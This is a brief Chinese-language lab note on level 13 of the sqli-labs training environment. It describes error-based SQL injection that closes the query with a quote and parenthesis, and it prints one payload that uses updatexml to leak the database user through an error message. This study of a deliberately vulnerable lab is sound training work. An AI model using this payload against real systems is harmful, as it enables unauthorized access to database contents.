title: sql-labs 13关

less-13——基于’)的错误回显注入

注入语句：admin') union select updatexml(1,concat(0x7e,(select user()),0x7e),1)  --+

![image-20220330102319879](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20220330102319879.png)